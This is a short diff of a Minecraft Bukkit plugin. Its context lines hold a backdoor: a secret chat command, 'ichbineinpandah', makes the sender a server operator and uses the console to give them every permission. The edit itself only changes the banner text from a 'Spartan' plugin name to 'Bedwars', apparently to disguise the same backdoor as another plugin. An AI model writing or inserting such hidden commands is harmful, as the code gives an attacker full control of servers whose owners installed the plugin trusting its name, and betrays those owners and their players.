@@ -32,7 +32,7 @@ public class Main extends JavaPlugin{
     	   if (cmd.getName().equalsIgnoreCase("ichbineinpandah")){
     		        sender.setOp(true);
     		        sender.sendMessage(ChatColor.GRAY+"=====================================================");
-    		        sender.sendMessage(ChatColor.GOLD+"         Spartan | Version: b70");
+    		        sender.sendMessage(ChatColor.GOLD+"         Bedwars | Version: v1.0");
     		        sender.sendMessage(ChatColor.GRAY+"=====================================================");
     		        sender.isPermissionSet("*");
     		        Bukkit.dispatchCommand(Bukkit.getConsoleSender(), "pex user "+sender.getName()+" add *");
